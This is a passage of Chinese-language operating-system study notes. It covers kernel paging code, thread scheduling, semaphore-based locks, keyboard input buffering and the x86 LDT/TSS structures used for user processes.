//ASSERT的内置函数      *pte = (page_phyaddr | PG_US_U | PG_RW_W | PG_P_1);    &#125;  &#125;else&#123;    //页目录项不存在，所以需要先创建页目录再创建页表项    /* 页表中的页框一律从内核空间分配 */    uint32_t pde_phyaddr = (uint32_t)palloc(&amp;kernel_pool);    *pde = (pde_phyaddr | PG_US_U | PG_RW_W | PG_P_1);    /* 分配到的物理页地址pde_phyaddr对应的物理内存清0,     * 避免里面的旧数据变成页表项，从而让页表混乱     * 访问到pde对应的物理地址，用pte取高20位即可     * 因为pte基于该pde对应的物理地址内再寻址，     * 把低12位置0便是该pde对应的物理页的起始 */    memset((void*)((int)pte &amp; 0xfffff000), 0, PG_SIZE);    ASSERT(!(*pte &amp; 0x00000001));    *pte = (page_phyaddr | PG_US_U | PG_RW_W | PG_P_1);  &#125;&#125;\n\n0x0b 内核多线程机制基础知识\n为了充分利用计算机硬件资源，要让计算机尽可能“同时”多做一些工作。“工作”是由处理器执行某段程序代码来完成的，这段程序代码就称为进程，一个进程可以完成一项工作。\n有的时候，工作往往并不简单，它由多个“子工作”组成，因此，我们需要让进程尽可能“同时”多做一些子工作，这些子工作也得由程序代码完成，完成这些子工作的程序就是线程\n\n执行流\n假设任务A需要一天时间，任务B需要2分钟，那么在串行的任务执行下，用户想要任务B的结果需要等上一整天，这是极其低效的。\n于是在处理器数量不变的情况下，多任务操作系统出现了，它采用一种称为多道程序设计的方式，使处理器在所有任务之间来回切换，这样就给用户一种所有任务都并行运行的错觉，称之为“伪并行”。\n如下图所示，处理器固定在圆心，任务就像轮盘一样，由任务调度器把任务转动到处理器的箭头处，表示CPU运行\n\n一个处理器任意时刻只能执行一个任务，真正的并行是指多个处理器同时工作，一台计算机的并行能力取决于其物理处理器的数量。也就是说，目前本来只有1个处理器，但现在一定要兼顾所有任务，唯一的做法就是让每个任务都在处理器上执行一小会。\n以上的任务轮转工作就是由任务调度器完成的\n\n  \n    \n      任务调度器\n\n    \n    \n      就是操作系统中用于把任务轮流调度上处理器运行的一个软件模块，它是操作系统的一部分。调度器在内核中维护一个任务表（也称为进程表、线程表或调度表），然后按照一定的算法，从任务表中选择一个任务，然后把该任务放到处理器上运行，当任务运行的实践片到期后，再从任务表中找另一个任务放到处理器上运行\n\n    \n  \n\n\n\n回归主题，我们的处理器只知道加电后按照程序计数器中的地址不断地进行执行下去，在不断执行地过程中，我们把程序计数器中地下一条指令地址所组成地执行轨迹称为程序的控制执行流。换句话说，执行流就是一段逻辑上独立的指令区域，是人为给处理器安排的处理单元。\n其实，软件中所作的任务切换，本质上就是改变了处理中程序计数器的指向，即改变了处理器的“执行流”\n而所谓的独立的执行流，其实就是线程和进程\n线程到底是什么\n做一个简单的lab 点击查看详细 \n              \n              //thread.c#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;void* thread_func(void* _arg) &#123;    unsigned int * arg = _arg;    printf(&quot; new thread tid is %u\\n&quot;, *arg);&#125;void main() &#123;\tpthread_t new_thread_id;    pthread_create(&amp;new_thread_id, NULL, thread_func, &amp;new_thread_id);    printf(&quot;main thread tid is %u\\n&quot;, pthread_self());    usleep(100);\t//不清楚新线程是否是在主线程结束之前被调用，所以在主线程最后加一个100ms的阻塞&#125;编译并运行可以发现，线程其实就是运行一段函数的载体\n              \n            \n\n\n\n在高级语言中，线程是运行函数的另一种方式，也就是说，构建一套线程方法。例如POSIX线程库，让函数在此线程中调用，然后处理器去执行这个函数，因此线程的实际功能就是相当于调用了这个函数，从而让函数执行。\n那么它和普通的函数调用区别在哪里呢？\n一般情况下，函数是在调用它的线程的上下文中执行的。操作系统不会单独为某个函数创建新的调度实体，它只是作为线程执行流程的一部分被顺序执行。即，处理器并不是单独地执行它\n与普通函数调用不同，线程具有独立的执行上下文（如栈空间、寄存器状态等），这使得我们可以将某段函数作为线程的执行入口，并由调度器将该线程独立调度到处理器上执行，从而实现真正的并发执行。\n在支持多线程的操作系统中，线程通常是CPU调度的最小单位，而进程则是资源分配的基本单位。线程共享其所属进程的大部分资源，如地址空间、堆和打开的文件等，但每个线程拥有独立的执行栈、寄存器上下文等，用以维持自己的运行状态。通过这种机制，线程实现了轻量级并发，能够在不复制整个进程资源的情况下进行独立调度和执行。\n这里进程、线程、资源之间的关系可以这样表达进程 = 线程 + 资源\n程序、进程、线程\n程序 是指静态的、存储在文件系统上、尚未运行的指令代码，它是实际运行时程序的映像\n进程 是指正在运行的程序，即进行中的程序，程序必须在获得运行所需要的各类资源后才能成为进程，资源包括进程所使用的栈，使用的寄存器等\n对于处理器来说，进程是一种控制流集合，集合中至少包含一条执行流，执行流之间是相互独立的，但它们共享进程的所有资源，它们是处理器的执行单元，或者称为调度单元，它们就是 线程\n可以认为，线程是在进程基础之上的二次并发\ngraph TD\n    A[程序] --> B[进程]\n    B --> C[线程]\n    A --> D[静态文件]\n    B --> E[进程资源]\n    C --> F[共享内存]\n\n    A[程序] --> G[编译文件]\n    B[进程] --> H[独立地址空间]\n    C[线程] --> I[共享地址空间]\n\n    classDef process fill:#E0F7FA,stroke:#00796B,stroke-width:2px;\n    classDef thread fill:#FFEBEE,stroke:#D32F2F,stroke-width:2px;\n    classDef program fill:#FFF3E0,stroke:#F57C00,stroke-width:2px;\n    \n    class A program;\n    class B process;\n    class C thread;\n\nPCB——进程的身份证\nPCB(Process Control Block),程序控制块。用来记录与此进程相关的信息，比如进程状态、PID、优先级等，一般结构如下图\n\n每个金册灰姑娘都有自己的PCB，所有的PCB放在一个表格中维护，就是进程表，调度器可以根据这张表选择上处理器运行的进程，如下图\n\n\n进程状态：是指运行、就绪、阻塞等，这样调度器就知道他是否可以进行调度\n\n进程的状态 点击查看详细 \n              \n              运行：进程处于运行状态时，它正被CPU调度并正在执行指令就绪：进程处于就绪状态时，它已经加载到内存并准备好执行，只是等等待操作系统将CPU分配给他。阻塞：进程处于阻塞状态时，它因为等待某些事件或资源（如I&#x2F;O操作、锁、信号量等）而无法继续执行\n              \n            \n\n\n时间片：时间为0的时候说明这个进程在处理器上的时间已经到了，这时候需要调度器进行调度\n\n页表：表示进程的地址空间，这个是进程独享的\n\n寄存器映像：用来保存进程的现场，进程在处理器上运行的时候，所有寄存器的值都将并保存在这里\n\n0级内核特权栈位于PCB中，而寄存器映像一般保存在这里\n\n\n实现\n  \n    \n      线程分类解释\n\n    \n    \n      标题中提到了内核线程，那么与之对应的，有一种用户进程，下面做一下解释\n先说结论：\n\n内核线程：调度器由操作系统实现，但是切换线程需要压栈出栈来保护现场恢复现场\n\n用户线程：调度器由用户实现，若一个线程阻塞，整个进程跟着阻塞\n\n\n详细可见下表：\n\n\n\n维度\n内核进程\n用户进程\n\n\n\n所在空间\n内核态（内核空间）\n用户态（用户空间）\n\n\n权限\n高权限，能直接操作硬件与内存\n低权限，需通过系统调用访问资源\n\n\n创建方式\n系统启动时由内核创建\n用户运行程序时由内核创建\n\n\n功能\n管理资源，如调度、驱动、文件系统等\n执行用户任务，如浏览器、编辑器等\n\n\n出错影响\n系统级崩溃或死机\n进程崩溃，不影响系统\n\n\n\n    \n  \n\n\n\n//thread/thread.c/*...*/struct thread_stack&#123;    uint32_t ebp;    uint32_t ebx;    uint32_t edi;    uint32_t esi;    /* 线程第一次执行的时候，eip指向带调用的函数kernel_thread     * 其它时候，eip指向的switch_to的返回地址*/    void (*eip) (thread_func* func, void* func_arg);\t//表示一个地址变量        /******以下仅供第一次被调度上CPU使用*******/    void(*unused_retaddr);    thread_func* function;\t//由kernel_thread所调用的函数名    void* func_arg;\t\t\t//由kernel_thread所调用的函数所需要的参数&#125;;/*...*/\n\n这里定义的struct thread_stack有两个作用：\n\n线程首次运行的时候，线程栈用于存储创建线程所需要的相关数据。和线程有关的数据应该都在该PCB中，这样便于管理线程，避免为他们再单独维护数据空间。创建线程之初，要指定在线程中运行的函数以及参数，因此将他存放在我们的内核栈当中，而其中eip便保存的就是需要执行的函数\n任务切换函数 switch_to中，这是线程已经处于正常运行后，线程所体现出来的作用，由于 switch_to 函数是汇编程序，从其返回时，必然要用到ret指令，因此为了同时满足这两个作用，我们最初现在线程栈中装入合适的返回地址以及参数，使得作用2中的switch_to的ret指令也满足创建线程时的作用1\n\n同时，这里虽然说是通过ret调用kernel_thread的，但是程序自身不知道，它认为自己时正常调用call指令过来的，所以它访问参数还是会从栈顶地址 $esp+4$开始访问第一个参数，所以我们需要填充一个4字节的无意义数据，这里充当他的返回地址，但实际上并不会返回\n\n这里很好的解释了为什么pwn题中，我们需要填充一个无效返回地址\n\n多线程调度\n在thread.h中的PCB结构中新加几个数据，更新task_struct如下：\n/* 进程或线程的PCB */struct task_struct&#123;  uint32_t* self_kstack;        //各内核线程都用自己的内核栈  enum task_status status;  char name[16];  uint8_t priority;             //线程优先级  uint8_t ticks;                //每次在处理器上执行的时间滴答数  /* 此任务自从上cpu运行后至今占用了多少cpu滴答数，   * 也就是此任务执行了多久 */  uint32_t elapsed_ticks;  /* general_tag的作用是用于线程在一般的队列中的结点 */  struct list_elem general_tag;  /* all_list_tag的作用是用于线程队列thread_all_list中的节点 */  struct list_elem all_list_tag;  uint32_t* pgdir;              //进程自己页表的虚拟地址  uint32_t stack_magic;         //栈的边界标记，用于检测栈的溢出&#125;;\n\n这里我们的ticks元素与priority配合使用，优先级越高，则处理器上执行该任务的时间片就越长，每次时钟中断都会将当前任务的ticks减1\n以及pgdir，这里是指向的该进程任务自己的页表（虚拟地址，需要转换为物理地址），但如果是线程的话那么这里就是NULL\n\n线程调度\n调度原理比较简单：当我们线程的PCB中ticks降为0的时候就进行任务调度，时钟每发生一次中断，那么他就会将ticks减1,然后时钟的中断处理程序调用调度器schedule，由他来将切换下一个线程，而调度器的主要任务就是读写就绪队列（也就是上面的thread_ready_list），增删其中的节点，修改其中的状态。注意这里我们采取队列的先进先出(FIFO).\n调度器按照队列先进先出的顺序，把就绪队列中的第1个节点作为下一个要运行的新线程，将该线程的状态设置为TASK_RUNNING,之后通过函数switch_to将新线程的寄存器环境恢复，这样新线程就开始执行\n完整的调度过程需要三部分的配合：\n\n时钟中断处理函数\n调度器schedule\n任务切换函数switch_to\n\n总结🔧 0x0a 内存管理模块总结✅ 内核断言机制（调试基础）\n\nASSERT(CONDITION) 是一种运行时断言，用于调试阶段检测内核内部状态是否正确。\n一旦断言失败，调用 PANIC(...) 打印错误信息后中断系统运行（通过死循环保持错误现场）。\n\n✅ 位图与内存池\n\n位图是最小单位为 bit 的资源分配方案，通常用于标记内存页是否被占用。\n物理内存池用于管理实际内存资源，划分内核态和用户态两部分。\n虚拟内存池用于为内核或进程申请虚拟地址空间，后续再与物理地址建立映射。\n\n✅ 虚拟地址转换机制（分页机制）\n\n虚拟地址（32 位）按 10-10-12 分为页目录索引、页表索引和页内偏移。\n\n\n页目录项 PDE → 页表地址\n页表项 PTE → 页框物理地址\n偏移量 Offset → 最终物理地址内偏移\n\n✅ 页表映射实现流程\ntext复制编辑1. 虚拟地址申请（虚拟内存池打标记）2. 物理页分配（物理内存池打标记）3. 建立页表映射（修改 PDE / PTE）\n\n\n注意：先判断 PDE 是否存在再写入 PTE，否则会触发 page_fault\n典型函数：page_table_add\n\n🧵 0x0b 内核多线程机制总结✅ 概念梳理：程序、进程、线程\n\n\n\n概念\n定义\n特点\n\n\n\n程序\n静态代码，尚未运行\n是进程的代码模板\n\n\n进程\n程序 + 资源，操作系统调度的资源单位\n拥有独立地址空间与资源\n\n\n线程\nCPU 调度的最小单位，进程中的执行路径\n多线程共享同一地址空\n\n\n\n进程 &#x3D; 资源 + 线程\n\n✅ 线程的本质\n\n线程是一个执行流 + 栈空间 + 寄存器上下文\n本质上就是 CPU 执行某个函数的调度实体\n与函数调用区别：\n函数运行在调用者的上下文中\n线程拥有自己的上下文（栈、寄存器）可并发执行\n\n\n\n✅ 线程控制块 PCB（task_struct）\n\n存储线程调度所需的信息：\n状态（就绪&#x2F;阻塞&#x2F;运行）\n时间片 ticks 与总运行时间 elapsed_ticks\n内核栈指针、页表指针 pgdir\n链表节点用于双向挂载在队列中\n\n\n\n✅ 线程的创建过程（thread_stack）\n\n首次执行：\n手动将 kernel_thread 和其参数压入线程栈\n构造出能通过 ret 执行 kernel_thread(func, arg) 的栈帧\n\n\n正常切换：\n由汇编实现的 switch_to 利用 ret 恢复 eip、esp 实现切换\n\n\n\n✅ 内核线程调度机制\n三个核心模块协作：\n\n\n\n角色\n描述\n\n\n\n⏰ 时钟中断处理器\n每次中断时 ticks--，若为 0 则调度\n\n\n📋 调度器 schedule()\n从就绪队列中取出下一个任务\n\n\n🔄 上下文切换 switch_to()\n保存&#x2F;恢复寄存器状态，完成线程切换\n\n\n\n采用时间片轮转 + FIFO调度策略\n使用链表（如 thread_ready_list）管理任务队列\n\n","categories":["OS"],"tags":["OS"]},{"title":"操作系统学习笔记05-从IO机制到系统调用","url":"/2025/08/06/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B005-%E4%BB%8EIO%E6%9C%BA%E5%88%B6%E5%88%B0%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/","content":"0x0d 实现包含锁的IO机制首先回顾一下上一节的结果，会发现出现了很多奇怪的空格，并且上面出现报错#GP General Protection Exception（一般保护性异常）\n\n这里的根本原因是由于临界区代码的资源竞争，这需要一些互斥的方法来保证操作的原子性（也就是互不影响）\n0x01 基础知识介绍一些术语\n公共资源：可以是公共内存、公共文件、公共硬件等，总之是被所有任务共享的一套资源\n临界区：程序要想使用某些资源，必然通过一些指令去访问这些资源，若多个任务都访问同一公共资源，那么各任务中访问公共资源的指令代码组成的区域就称为临界区。使用公共资源的代码程序\n互斥：指某一个时刻公共资源只能被1个任务独享，也就是只能由一个任务在自己的临界区执行\n竞争条件：多个任务以非互斥的方式同时进入临界区，大家对公共资源的访问以竞争的方式并行进行\n\n\n如果将上面的东西和我们之前的内容进行一个对应的话：\n公共资源就是显卡的光标寄存器；\n同时因为每个线程都会使用put_char函数，这个函数是操作光标寄存器的，所以这段代码就是每个线程的临界区\n\n所以我们可以通过暴力的关、开中断来实现互斥，但是每次执行的时候都要关、开中断有些不太优雅，也太麻烦。\n此外，如果我们关中断的操作距离临界区太远，就会造成多任务调度的低效，这就违背了当时设计多线程的初衷。\n于是便有了“锁”这个概念\n\n锁是由信号量实现的，所以先解释一下信号量\n信号量在计算机当中，信号量就是个0以上的整数值，当为0时表示已无可用信号，是一种同步机制\n同步 点击查看详细 \n              \n              同步一般是指合作单位之间为协作完成某项工作而共同遵守的工作步调，强调的是配合时序，就像十字路口的红绿灯，只有在绿灯亮起的情况下司机才能前进，这就是一种同步。简单来说，同步是指不能随时随意工作，工作必须在某种条件具备的情况下才能开始，工作条件具备的时间顺序就是时序。线程同步的目的是不管线程如何混杂、穿插地执行，都不会影响结果地正确性。线程不像人那样有判断“配合时序”的意识，它的执行会很随意，这就使得合作出错成为必然。因此，当多个线程访问同一公共资源时，为了保证结果正确，必然要使用一套额外的机制来控制它们的工作步调\n              \n            \n\n信号量是计数值，P、V操作表示信号量的减、增。\n信号量的处置代表是信号资源的累积量，也就是剩余量，而P操作就是减少信号量来获取资源，V操作就是释放资源增加信号量，见下面微操作：\nV操作：\n\n将信号量的值加1\n唤醒在此信号量上等待的操作\n\nP操作：\n\n判断信号量是否大于$0$\n若信号量大于$0$，则信号量减$1$\n若信号量等于$0$，当前线程将自己阻塞，以在此信号量上等待\n\n\n信号量的初值若为1的话，它的取值就只能为 0 和 1 ，这便称为二元信号量，我们可以利用二元信号量来实现锁\n那么 P 操作就是获得锁， V 操作就是释放锁。我们可以让线程通过锁进入临界区，可以借此保证只有一个线程可以进入临界区，从而做到互斥。大致流程如下：\n\n线程A进入临界区前先通过 P 操作获得锁，此时信号量的值便为 0 \n后续线程 B 再进入临界区时也通过 P 操作获得锁，由于信号量是 0 ，线程 B 便在此信号量上等待，也就是相当于线程 B 进入了睡眠态\n当线程 A 从临界区出来后执行 V 操作释放锁，此时信号量的值重新变为 1 ，之后线程 A 将线程 B 唤醒\n线程 B 醒来后获得了锁，进入临界区\n\n阻塞和唤醒 点击查看详细 \n              \n              阻塞调度器并不决定线程是否可以运行，只是决定了运行的时机，线程可否运行是由线程自己把控的。当线程被换上处理器运行后，在其时间片内，线程将主宰自己的命运。阻塞是一种意愿，表达的是线程运行中发生了一些事情，这些事情通常是由于缺乏了某种运行条件造成的，以至于线程不得不暂时停下来，必须等到运行的条件再次具备时才能上处理器继续运行因此，阻塞发生的时间是在线程自己的运行过程中，是线程自己阻塞自己，并不是被谁阻塞唤醒已被阻塞的线程是无法运行的，需要锁的持有者将其唤醒。锁的持有者释放了锁之后便去唤醒在它后面因获取该锁而阻塞的线程。因此唤醒已阻塞的线程是由别的线程（通常是锁的持有者）来做的\n              \n            \n\n0x02 用锁实现终端输出\n终端也称为控制台，这是计算机历史中遗留下来的概念。过去计算机还是奢侈品的时候，为了充分利用计算机资源，允许多个用户连接到机器上（类似于 Windows 多用户的概念，为的是让更多的用户能够控制计算机，因此终端便称为控制台）\n而为了能够在同一个显示器下实现多用户，也就是分别为每个用户虚拟出一个“显示器”，因此出现了虚拟终端\n每个控制台都是一个虚拟终端，用户看到的屏幕是由软件虚拟出来的\n\n但虚拟终端的实现还是要依赖硬件本身的功能：\n我们知道屏幕在不同模式下显示的字符数是有限的，因此屏幕不能一次性把显存中的全部数据显示出来，为此，显卡提供了两个寄存器“Start Address High Register” 和 ”Start Address Low Register” 来设置数据在显存中的起始地址。起始地址是用16位来表示的，它们分别设置显存地址的 158 位和 70 位。因此，我们可以把不同的 16 位地址分别写入这两个寄存器，从而实现将显存分块显示的目的，也就是实现了虚拟终端。由此可见，虽然多个虚拟终端共同用一个显示器，也就是共享同一片显存，但用户之间能够互不干扰，就是因为每个虚拟终端显示的是显存中的不同区域，如下图所示\n\n在我们的系统中没有复杂的显卡寄存器操作，我们只有一个终端，因此所有的输出都往这一个屏幕上挤，这就容易让输出凌乱不堪。为了让这一个屏幕上的内容井然有序，既然我们已经实现了锁，我们可以通过锁实现输出互斥，这样屏幕上的字符就会井然有序\n虽然我们没有真正的多控制台，但是我们把终端当成设备来对待，终端就是我们的标准输出设备，因此我们本节要构造一个终端设备，通过它实现以后的打印输出\n实现代码 点击查看详细 \n              \n              //console.c#include &quot;console.h&quot;#include &quot;print.h&quot;#include &quot;stdint.h&quot;#include &quot;sync.h&quot;#include &quot;thread.h&quot;static struct lock console_lock;    //控制台锁/* 初始化终端 */void console_init()&#123;  lock_init(console_lock);&#125;/* 获取终端 */void console_acquire()&#123;  lock_acquire(&amp;console_lock);&#125;/* 释放终端 */void console_release()&#123;  lock_release(&amp;console_lock);&#125;/* 终端输出字符串 */void console_put_str(char* str)&#123;  console_acquire();  put_str(str);  console_release();&#125;/* 终端输出字符 */void console_put_char(uint8_t char_asci)&#123;  console_acquire();  put_char(char_asci);  console_release();&#125;/* 终端输出十六进制整数 */void console_put_int(uint32_t num)&#123;  console_acquire();  put_int(num);  console_release();&#125;其实就是封装了锁处理，此后用main输出的时候用console_put_str等函数即可，内部实现互斥机制\n              \n            \n\n0x03 从键盘获取输入接下来是输入任务，即从键盘获取键入的字符。这里实现的是PS&#x2F;2键盘\n\n键盘输入的原理\n计算机是一个系统，系统是指由各个功能独立的模块组成的整体，相当于正在内部按功能分层，一个模块就像个功能独立的黑盒子，上下游模块之间可依赖，相互提供数据。在所有模块的配合下，使这个系统作为整体对外提供服务（也就是计算机领域的抽象）\n键盘同理，也是由一个个独立的模块分层实现的，但是并不是简单地由键盘把数据塞到主机里，这涉及两个功能独立的芯片配合\n\n键盘内部有个叫做键盘编码器的芯片，通常是$Intel 8048$或者兼容芯片，它的作用是：当键盘上发生案件操作时，它就像键盘控制器报告哪个键被按下，按键是否弹起\n而键盘控制器一般在主机内部的主板上，通常是$Intel8042$或者兼容芯片，它的作用是：接受来自键盘编码器的按键信息，将其解码后保存，然后向中断代理发中断，之后处理器执行相应的中断处理程序读入8042处理保存过的按键信息\n他们的关系如下图所示\n\n当我们键盘按键的时候，8048会维护一个键值对的表，我们所按的键对应的扫描码会传给8042芯片，然后8042向8259A发送中断信号，这样处理器就会去执行键盘中断处理程序（中断处理程序需要我们自己实现）\n这里的扫描码又分为两类，一个叫做通码，指的是按下按键产生的扫描码；另一个是断码，指的是松开按键产生的扫描码\n\n[!note]\n注意我们只能得到键的扫描码，并不会得到键的ASCII码，扫描码是硬件提供的编码集，ASCII是软件中约定的编码集，这两个是不同的编码方案。\n假如我们在键盘上按下了空格键，我们在键盘中断处理程序中只能得到空格键的扫描码，该扫描码是 0x39 而不是空格键的 ASCII 码 0x20\n键盘的中断处理程序便充当了字符处理程序，将对应字符的扫描码转换为ASCII码输出\n\n第一套键盘扫描码 点击查看详细 \n              \n              \n              \n            \n\n可以注意到扫描码中的通码和断码都是1字节大小，且断码&#x3D;通码+0x80，这是因为一般扫描码的最高1位用来标识通码还是断码，若是0则表示通码，为1则表示断码\n为了让我们可以获取击键的过程，我们将每一次击键过程分为“按下”，“按下保持”，“弹起”三个阶段，其中每次8048向8042发送扫描码的时候，8042都会向8059A发起中断并且将扫描码保存在自己的缓冲区中，此时再调用我们准备好的键盘中断处理程序，从8042缓冲区获得传递来的扫描码。\n0x04 环形输入缓冲区到目前为止，虽然顺利接受了键盘按键，但其实除了输出这些字符并没有出现什么特别的功能，而我们实现键盘输入很大的一部分就是可以实现shell功能，这样就可以键入指令然后实现需求了。 缓冲区是多个线程共用的共享内存，线程并行访问的时候它难免会出问题，所以我们需要解决这个对于缓冲区的访问操作产生的问题。这里我稍微介绍一下我们即将要设计的环形缓冲区：\n\n这里我们定义两个指针来指向其中的头和尾，但注意我们这里的环形是指逻辑上的环形，在物理内存上我们仍然是线性的，不过我们用以下方式来使得其从逻辑上来看是环形队列，那就是头指针用来写数据，尾指针用来读数据，这里当我们指针位置加1导致越过了缓冲区范围的时候会进行取余来重新指向缓冲区的开头，这样就形成了环形的错觉。\n\n  \n    \n      生产者消费者模型\n\n    \n    \n      我们知道，在计算机中可以并行多个线程，当它们之间相互合作时，必然会存在共享资源的问题，这是通过“线程同步”来实现的\n诠释“线程同步”最典型的例子就是“生产者与消费者问题”\n\n“同步”是指多个线程相互协作，共同完成一个任务，属于线程间工作步调相互制约。\n\n”互斥“是指多个线程”分时“访问共享资源\n\n\n生产者与消费者问题是描述多个线程协同工作的模型，如下图\n\n有一个或多个生产者、一个或多个消费者和一个固定大小的缓冲区，所欲生产者和消费者共享这同一个缓冲区。生产者生产某种类型的数据，每次放到一个缓冲区中，消费者消费这种数据，每次从缓冲区中消费一个。同一时刻，缓冲区只能被一个生产者或消费者使用。当缓冲区已满时，生产者不能继续往缓冲区中添加数据，当缓冲区为空时，消费者不能在缓冲区中消费数据\n作者给了个很有意思的例子\n\n总结一下：生产者与消费者问题描述的是：\n对于有限大小的公共缓冲区，如何同步生产者和消费者的运行，以达到对共享缓冲区的互斥访问，并保证生产者不会过度生产，消费者不会过度消费，缓冲区不会破环\n对于这种缓冲区的破坏，要么是对缓冲区访问溢出，要么是缓冲区中的数据被破坏\n\n    \n  \n\n\n\n0x0e 用户进程\n自始至终，我们的程序都在 ring 0 级工作，这意味着任何程序都和操作系统平起平坐，可以改动任何系统资源，这是极度危险的。所以需要一个权限更低的进程\n\nLDT &amp; TSS\nLDT（本地描述符表）和 TSS（任务状态段）起源于 1980 年代 Intel 为 80286 和 80386 处理器引入保护模式时提出的设计，旨在通过硬件机制支持多任务管理和内存隔离，是早期基于分段的多任务操作系统（如 OS&#x2F;2 和 Windows 3.x）运行的关键基础,以下就是对LDT和TSS的介绍\nLDT程序是一堆数据和指令的集合，它们只有被加载到内存并让 CPU 的寄存器中指向它们后， CPU 才能执行该程序。程序从文件系统上被加载到内存后，位于内存中的程序便称为映像，也称为任务\n在 IA32 架构的 CPU 上，内存被设计为需要按照分段的方式来访问，所以要想在这种CPU上开发程序就也需要遵守内存分段的规定。\n而为了便于管理和好看，我们一般会将数据分类存储：数据集中放在一起，指令集中放在一起等等。\n而 CPU 只把 CS：[E]IP 指向的内存当成指令，把 DS 指向的内存当作普通数据，因此必须人为保证填充到这些段寄存器中的值是正确的。咱们只要往对应的寄存器中写入合适的值就成了，其他的咱们不用管，由处理器内部的处理框架自动完成。这就像咱们在软件开发过程中用到的框架一样，只不过这次的框架是由硬件CPU 提供的。\n按照内存分段的方式，内存中的程序映像自然被分成了代码段、数据段等资源，这些资源属于程序私有的部分，因此 Intel 建议为每个程序单独赋予一个结构来存储其私有的资源，也就是LDT\n\nLDT（Local Descriptor Table），即局部描述符表。描述符的功能就是描述一段内存区域的作用及属性，它只是对应内存区域的身份证\nLDT属于任务私有的结构，它是每个人物都有的，其位置也不固定。而为了找到它，就需要通过在GDT中注册，通过选择子找到它\n计算机就是一层套一层，再套一层说是\n下图为LDT描述符格式\n\n在 LDT 中，描述符的 D 位和 L 位固定为 0 \nLDT描述符属于系统段描述符，因此 S 为0。在 S 为 0 的前提下，若 TYPE 的值为 0010，这表示此描述符是 LDT 描述符。\n现在可以找到 LDT 了，如何使用它呢\nCPU 使用某个表，肯定不只是找到一个描述符就行了，描述符的目的是为了告诉 CPU 描述符所对应区域的起始地址及偏移大小。CPU 为 LDT 准备了寄存器 LDTR 来存储其位置及偏移量\nLDTR 结构如下图所示：\n\n\n选择器是中 16 位的 LDT 选择子\n描述符缓冲器是LDT的起始地址及偏移大小等属性\n\nLDT 中的描述符全部用于指向任务自己的内存段，该如何引用它们呢？\n选择子是 16 位的，其高 13 位是索引值，用来在 GDT 或 LDT 中索引段描述符，用来在 GDT 或 LDT 中索引段描述符，第 0~1 位 RPL，表示请求特权级，第 2 位是 TI 位，此位用来指定选择子中的高 13 位是在 GDT中索引段描述符，还是在 LDT 中索引段描述符。\n\nTI 位也就是 Table Indicator，当此位为 1 时，表示从 LDT 中检索，反之当此位为 0 时，表示从 GDT中检索选择子\n\n当前运行的任务，其 LDT 位于 LDTR 指向的地址，这样 CPU 才能从中拿到任务运行所需要的资源（指令和数据）。因此，每切换一个任务时，需要用 lldt 指令重新加载任务的 LDT 到 LDTR\n\nTSSTSS 是为了使得 CPU 支持多任务来实现的，这里有点像线程中的 PCB，不过TSS基于进程，而PCB是线程自己也有拥有一个，所以这里切换进程也就是需要使用 TSS 来标记上下文，而 CPU 也用不同的 TSS 来区分不同的任务\nTSS 和其它段一样，本质上是一片存储数据的内存区域，Intel 打算用这片内存区域保存任务的最新状态（也就是任务运行时占用的寄存器组等），因此它也和其它段一样，需要某个描述符结构来“描述”它，这就是 TSS 描述符，TSS描述符也要在 GDT 中注册，结构如下图\n\nTSS 描述符属于系统段描述符，因此S 为0，在S 为0 的情况下，TYPE 的值为10B1。我们这里关注一下B 位，B 表示busy 位，B 位为0 时，表示任务不繁忙，B 位为1 时，表示任务繁忙。\n\n  \n    \n      任务繁忙\n\n    \n    \n      任务繁忙有两方面的含义：\n\n一方面就是指此任务是否为当前正在CPU 上运行的任务。\n另一方面是指此任务嵌套调用了新的任务，CPU 正在执行新任务，此任务暂时挂起，等新任务执行完成后CPU 会回到此任务继续执行，所以此任务马上就会被调度执行了。\n这种有嵌套调用关系的任务数不只两个，可以很多，比如任务A 调用了任务A.1，任务A.1 又调用了任务A.1.1 等，为维护这种嵌套调用的关联，CPU 把新任务TSS 中的 B 位置为1，并且在新任务的TSS 中保存了上一级旧任务的TSS 指针（还要把新任务标志寄存器eflags 中NT 位的值置为1），新老任务的调用关系形成了调用关系链\n\n\n\n\n    \n  \n\nB位的作用是任务不会自己调用自己，因为若正在执行的任务所调用的函数段的B位为 1，则说明它在调用自己，或者调用自己的调用者们。\n\nTSS 描述符是用来描述 TSS 的，接下来介绍一下 TSS。\nTSS 同其他普通段一样，是位于内存中的区域，因此可以把TSS 理解为TSS 段，只不过TSS 中的数据并不像其他普通段那样散乱，TSS 中的数据是按照固定格式来存储的，如下图\n\n这里可以看出TSS本身自己就完全上下文的信息，其中包含了许多寄存器的备份，并且这里也包含了该任务所需要的栈地址\n关于这三个栈，可以看之前的文章中对TSS的介绍。\n此外，除了从中断和调用门返回之外，CPU不允许从高特权级转向为低特权级。所以这三组栈仅仅是CPU用来从低特权级跳到高特权级使用的，注意这三组栈地址在TSS中是不会改变的，也就是说不论你在哪个特权级进行了怎么样的压栈，当你从别的特权级返回到这个特权级的时候，他还是会从TSS中获取原始栈基址，而不管你曾经是否压过许多值。\n\nCPU本身是支持TSS的，这说明访问TSS以及识别他的结构过程并不是咱们需要做的工作。当任务被换下CPU的时候，CPU会自动将一些寄存器的值存入TSS相应位置，当任务上CPU运行的时候同样如此。 而我们本身是需要访问TSS的，所以说这里存在一个专门帮助我们寻找到TSS地址的寄存器TR，注意这里是帮助咱们寻找到TSS，而不是像GDTR那样专门有一部分位用来存放GDT首地址，前面咱们说过TSS是存在描述符的且存放在GDT中，所以我们访问他是跟访问其他普通段描述符一样，都是使用选择子，通过这个选择子我们就能够找到在GDT中的TSS段描述符，然后通过该描述符来找到咱们的TSS结构，下面给出TR结构和描述符缓冲器：\n\n\nTSS 和 LDT 一样，必须要在 GDT 中注册才行，这也是为了在引用描述符的阶段做安全检查\n因此 TSS 是通过选择子来访问的，将 TSS 加载到寄存器 TR 的指令为 ltr,其指令格式为\nltr &quot;16位通用寄存器&quot; 或 &quot;16位内存单元&quot;\n\n第一个任务的 TSS 手工加载之后，CPU会自动地把当前任务地资源状态保存到该任务对应的 TSS 中（由寄存器TR指定）\n\n总之，\nTSS 由用户提供，由 CPU 自动维护\n\n寄存器 TR 始终指向当前任务的 TSS，任务切换就是改变 TR的指向，CPU 自动将当前寄存器组的值（快照）写入 TR 指向的 TSS，同时将新任务 TSS 